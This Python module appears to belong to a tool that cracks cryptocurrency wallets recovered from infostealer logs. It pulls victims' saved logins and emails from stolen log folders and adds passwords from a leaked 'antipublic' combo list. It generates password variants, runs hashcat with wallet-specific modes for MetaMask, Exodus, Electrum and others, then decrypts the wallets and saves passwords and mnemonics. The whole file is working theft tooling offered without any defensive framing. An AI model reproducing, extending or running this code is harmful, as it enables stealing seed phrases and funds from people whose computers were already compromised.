import multiprocessing
import os
import re
import platform
import subprocess
from wallets import decrypt

from datetime import datetime
from distutils.dir_util import copy_tree


#! PRINTS --------------------------------------------------------------------------
system_type = platform.system()
if system_type == "Windows":
    os.system("color")


class c:
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    END = "\033[0m"


def write_logs(msg):
    try:
        with open("results/info.log", "a", encoding="utf8", errors="ignore") as f:
            f.write(datetime.now().strftime("%d/%m/%Y %H:%M:%S") + f" - {msg}\n")
    except:
        pass


#! PATHS --------------------------------------------------------------------------
def get_path_wallet_folder(path_wallet):
    path_wallet_folder = path_wallet.split("/")[:-1]
    path_wallet_folder = "/".join(path_wallet_folder)
    return path_wallet_folder


def get_path_log(path_wallet):
    path_log = False

    if "/CryptoWallets/" in path_wallet:
        path_log = path_wallet.split("/CryptoWallets/")[0]
    elif "/cryptocurrency/" in path_wallet:
        path_log = path_wallet.split("/cryptocurrency/")[0]
    elif "/Wallets/" in path_wallet:
        path_log = path_wallet.split("/Wallets/")[0]
    elif "/wallets/" in path_wallet:
        path_log = path_wallet.split("/wallets/")[0]
    elif "/Coins/" in path_wallet:
        path_log = path_wallet.split("/Coins/")[0]
    elif "/coins/" in path_wallet:
        path_log = path_wallet.split("/coins/")[0]
    elif "/Plugins/" in path_wallet:
        path_log = path_wallet.split("/Plugins/")[0]
    elif "/plugins/" in path_wallet:
        path_log = path_wallet.split("/plugins/")[0]
    elif "/Cold Wallets/" in path_wallet:
        path_log = path_wallet.split("/Cold Wallets/")[0]
    elif "/Crypto/" in path_wallet:
        path_log = path_wallet.split("/Crypto/")[0]
    elif "/_Wallet/" in path_wallet:
        path_log = path_wallet.split("/_Wallet/")[0]
    elif "/_wallet/" in path_wallet:
        path_log = path_wallet.split("/_wallet/")[0]
    elif "/Wallet/" in path_wallet:
        path_log = path_wallet.split("/Wallet/")[0]
    elif "/wallet/" in path_wallet:
        path_log = path_wallet.split("/wallet/")[0]

    return path_log


def is_wallet(path_wallet, wallet):
    if "/CryptoWallets/" in path_wallet:
        path_log = path_wallet.split("/CryptoWallets/")[-1]
    elif "/cryptocurrency/" in path_wallet:
        path_log = path_wallet.split("/cryptocurrency/")[-1]
    elif "/Wallets/" in path_wallet:
        path_log = path_wallet.split("/Wallets/")[-1]
    elif "/wallets/" in path_wallet:
        path_log = path_wallet.split("/wallets/")[-1]
    elif "/Coins/" in path_wallet:
        path_log = path_wallet.split("/Coins/")[-1]
    elif "/coins/" in path_wallet:
        path_log = path_wallet.split("/coins/")[-1]
    elif "/Plugins/" in path_wallet:
        path_log = path_wallet.split("/Plugins/")[-1]
    elif "/plugins/" in path_wallet:
        path_log = path_wallet.split("/plugins/")[-1]
    elif "/Cold Wallets/" in path_wallet:
        path_log = path_wallet.split("/Cold Wallets/")[0]
    elif "/Crypto/" in path_wallet:
        path_log = path_wallet.split("/Crypto/")[0]
    elif "/_Wallet/" in path_wallet:
        path_log = path_wallet.split("/_Wallet/")[-1]
    elif "/_wallet/" in path_wallet:
        path_log = path_wallet.split("/_wallet/")[-1]
    elif "/Wallet/" in path_wallet:
        path_log = path_wallet.split("/Wallet/")[-1]
    elif "/wallet/" in path_wallet:
        path_log = path_wallet.split("/wallet/")[-1]
    else:
        return False

    if wallet in path_log.lower():
        return True
    else:
        return False


#! RESULTS --------------------------------------------------------------------------
def save_failed(path_results, wallet_type, path_wallet, hashcat, addresses, passwords):
    try:
        output = "+--------------------+--------------------------------------------------------------------+\n"
        output += f"| Path...............| {path_wallet}\n"
        if hashcat:
            output += f"| Hash...............| {hashcat}\n"
        for address in addresses:
            output += f"| Address............| {address}\n"
        if len(passwords) > 0:
            output += f"| Passwords..........|\n"
            for password in passwords:
                output += password + "\n"

        with open(os.path.join(path_results, f"{wallet_type}.txt"), "a", encoding="utf8") as f:
            f.write(output + "\n")

        with open(os.path.join(path_results, "all.txt"), "a", encoding="utf8") as f:
            f.write(output + "\n")
    except:
        pass


def save_cracked(path_results, wallet_type, path_wallet, password, addresses, mnemonics):
    try:
        output = "+--------------------+--------------------------------------------------------------------+\n"
        output += f"| Path...............| {path_wallet}\n"
        output += f"| Password...........| {password}\n"

        for mnemonic in mnemonics:
            output += f"| Mnemonic...........| {mnemonic}\n"

        for address in addresses:
            output += f"| Address............| {address}\n"

        with open(os.path.join(path_results, f"{wallet_type}.txt"), "a", encoding="utf8") as f:
            f.write(output + "\n")

        with open(os.path.join(path_results, "all.txt"), "a", encoding="utf8") as f:
            f.write(output + "\n")
    except:
        pass


def save_mnemonics(path_results, path_wallet, mnemonics):
    try:
        for mnemonic in mnemonics:
            try:
                with open(os.path.join(path_results, f"{path_wallet}.txt"), "a", encoding="utf8") as f:
                    f.write(mnemonic + "\n")

                with open(os.path.join(path_results, "all.txt"), "a", encoding="utf8") as f:
                    f.write(mnemonic + "\n")
            except:
                pass
    except:
        pass


def save_passwords(path_log, passwords, emails_log):
    try:
        path_dict = os.path.join(path_log, "cracked_passwords.txt")
        if not os.path.exists(path_dict):
            with open(path_dict, "w", encoding="utf8") as f:
                f.write("\n".join(str(i) for i in passwords))

        path_emails = os.path.join(path_log, "cracked_emails.txt")
        if not os.path.exists(path_emails):
            with open(path_emails, "w", encoding="utf8") as f:
                f.write("\n".join(str(i) for i in emails_log))
    except:
        return False


def copy_folder(path_log):
    try:
        wallet_name = path_log.split("/")[-1]
        copy_tree(path_log, f"failed_logs/{wallet_name}")
    except:
        pass


#! PASSWORDS --------------------------------------------------------------------------
def get_passwords(path_file):
    regex = [
        r"Username: (.*)\nPassword: (.*)",
        r"USER: (.*)\nPASS: (.*)",
        r"login: (.*)\npassword: (.*)",
        r"Login: (.*)\nPassword: (.*)",
        r"LOGIN: (.*)\nPASSWORD: (.*)",
        r"Login: (.*)\nPass: (.*)",
        r"USER:		(.*)\nPASS:		(.*)",
    ]

    regex_emails = r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"

    password_list = set()
    email_list = set()

    try:
        with open(path_file, "r", encoding="utf8", errors="ignore") as f:
            file = f.read()

        for regx in regex:
            matches = re.finditer(regx, file, re.MULTILINE)
            for item in matches:
                if item.group(1):  # username group
                    email = re.match(regex_emails, item.group(1))  # emails
                    if email:
                        email_list.add(email[0])
                    else:
                        if item.group(1) != "UNKNOWN":  # usernames
                            password = item.group(1).strip()
                            if verify_password(password):
                                password_list.add(password)

                if item.group(2):  # password group
                    if item.group(2) != "UNKNOWN":
                        password = item.group(2).strip()
                        if verify_password(password):
                            password_list.add(password)
    except:
        pass

    return password_list, email_list


def get_autofills(path_file):
    email_list = set()
    regex_emails = r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"

    try:
        with open(path_file, "r", encoding="utf8", errors="ignore") as f:
            file = f.read()

        match = re.findall(regex_emails, file, re.MULTILINE)
        for m in match:
            email_list.add(m)
    except:
        pass

    return email_list


def verify_password(password):
    # password = re.sub(r"[^\x00-\x7f]", r"", password)
    # if len(password) >= 8 and len(password) <= 42 and " " not in password:
    return password


def create_dict(path_source):
    password_list = set()
    email_list = set()

    try:
        for filename in os.listdir(path_source):
            path_full = os.path.join(path_source, filename)
            path_full_low = path_full.lower()

            if path_full.endswith(".txt") and "password" in path_full_low:
                passwords, emails = get_passwords(path_full)
                password_list.update(passwords)
                email_list.update(emails)

            elif os.path.isdir(path_full) and "autofills" in path_full_low:
                for filename in os.listdir(path_full):
                    path_full = os.path.join(path_full, filename)
                    autofills = get_autofills(path_full)
                    email_list.update(autofills)

        for email in email_list:
            login = email.split("@")[0]
            if verify_password(login):
                password_list.add(login)
    except:
        pass

    return password_list, email_list


def generate_passwords(passwords_log, toggle_case, add_specials, add_numbers):
    passwords = set()

    for password in passwords_log:
        passwords.add(password)

        if toggle_case:
            passwords.add(password.lower())
            passwords.add(password.upper())
            passwords.add(password.title())

        if add_specials:
            special_symbols = ["!", "?", "#", "@", "$", "%", "&", "*", "^", "+", ".", ",", ":", ";", "=", "-", "~", "|", "/"]

            passwords.add("(" + password + ")")
            passwords.add("{" + password + "}")
            passwords.add("<" + password + ">")
            passwords.add("[" + password + "]")

            for special_symbol in special_symbols:
                passwords.add(password + special_symbol)
                passwords.add(special_symbol + password)

        if add_numbers:
            numbers = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
            for number in numbers:
                passwords.add(password + number)
                passwords.add(number + password)

    return passwords


def get_passwords_antipublic(path_antipublic, email):
    passwords = set()

    try:
        email = email.lower()
        email_login = email.split("@")[0]
        with open(path_antipublic, "r", encoding="utf8", errors="ignore") as f:
            for line in f:
                try:
                    line = line.strip()
                    line_split = line.split(":")
                    email_ap = line_split[0].lower()
                    email_ap_login = email_ap.split("@")[0]
                    password = line_split[1]
                    if email_login == email_ap_login:
                        passwords.add(password)
                except:
                    pass
    except:
        pass

    return passwords


def process_passwords(path_wallet, path_log, path_antipublic, passwords_dictionary, toggle_case, add_specials, add_numbers, timeout):
    passwords_log, emails_log = create_dict(path_log)
    if path_antipublic:
        for email in emails_log:
            password_ap = get_passwords_antipublic(path_antipublic, email)
            write_logs(f"GOT AP PASSWORDS: {len(password_ap)} - '{path_wallet}'")
            passwords_log.update(password_ap)
    passwords_log.update(passwords_dictionary)
    passwords = generate_passwords(passwords_log, toggle_case, add_specials, add_numbers)
    passwords = list(passwords)[0:timeout]
    save_passwords(path_log, passwords, emails_log)
    write_logs(f"BRUTE STARTED (PASSWORDS: {len(passwords)}) - '{path_wallet}'")
    return passwords


#! OTHER --------------------------------------------------------------------------
def clear():
    os.system("cls" if os.name == "nt" else "clear")


def set_title(title):
    system_type = platform.system()
    if system_type == "Windows":
        os.system("title " + title)
    elif system_type == "Linux":
        print(f"\33]0;{title}\a", end="", flush=True)


def get_cores():
    cores = multiprocessing.cpu_count()

    if cores > 1:
        cores = cores - 1

    if cores > 60:
        cores = 60

    return cores


#! HASHCAT --------------------------------------------------------------------------
def get_hash_mode(wallet_name, wallet_hash):
    hash_mode = False
    if wallet_name in [
        "metamask",
        "ronin",
        "unisat",
        "brave_extension",
        "bnb_chain",
        "clover",
        "kardia_chain",
        "sui",
        "braavos",
        "rabby",
        "cryptocom",
        "cryptocom_extension",
        "safepal",
        "metamask_like",
        "coinbase",
    ]:
        hash_mode = 26620
    elif wallet_name == "trust":
        hash_mode = 26625
    elif wallet_name == "tronlink":
        if "$metamask$" in wallet_hash:
            hash_mode = 26620
        elif "$tronlink$" in wallet_hash:
            hash_mode = 26621
    elif wallet_name == "coinomi":
        hash_mode = 27700
    elif wallet_name == "atomic":
        hash_mode = 26622
    elif wallet_name == "guarda":
        hash_mode = 26623
    elif wallet_name == "keplr":
        hash_mode = 26624
    elif wallet_name == "phantom":
        pass
    elif wallet_name == "terra":
        hash_mode = 26626
    elif wallet_name == "okx":
        hash_mode = 26627
    elif wallet_name == "myetherwallet":
        if "$ethereum$p" in wallet_hash:
            hash_mode = 15600
        elif "$ethereum$s" in wallet_hash:
            hash_mode = 15700
    elif wallet_name == "electrum":
        if "$electrum$1" in wallet_hash:
            hash_mode = 16600
        elif "$electrum$4" in wallet_hash:
            hash_mode = 21700
        elif "$electrum$5" in wallet_hash:
            hash_mode = 21800
    elif wallet_name in ["bitcoin", "litecoin", "doge", "dash"]:
        hash_mode = 11300
    elif wallet_name in ["exodus_extension", "exodus_desktop"]:
        hash_mode = 28200

    return hash_mode


def try_hashcat(path_hashcat, path_hashcat_binary, hash_mode, wallet_hash, path_log, proc_data):
    try:
        os.chdir(path_hashcat)
        attack_mode = 0
        launch_options = [path_hashcat_binary]

        path_hashcat_results = "temp_hashcat_results.txt"
        if os.path.exists(path_hashcat_results):
            os.remove(path_hashcat_results)

        if not os.path.exists(f"{path_log}/cracked_passwords.txt"):
            os.chdir(os.path.dirname(os.path.realpath(__file__)))
            return False

        launch_options.extend(["-S", "-w4", f"-m{hash_mode}", f"-a{attack_mode}", f"-o{path_hashcat_results}", f"{wallet_hash}", f"{path_log}/cracked_passwords.txt"])
        subprocess.run(launch_options)

        if os.path.exists(path_hashcat_results):
            with open(path_hashcat_results, "r", encoding="utf8", errors="ignore") as f:
                last_line = f.readlines()[-1].strip()
                correct_password = last_line.split(":")[-1]
            os.remove(path_hashcat_results)
            decrypted_data = decrypt.proc_wallet(proc_data, correct_password)
        else:
            decrypted_data = False

        os.chdir(os.path.dirname(os.path.realpath(__file__)))
        return decrypted_data
    except:
        os.chdir(os.path.dirname(os.path.realpath(__file__)))
        return False
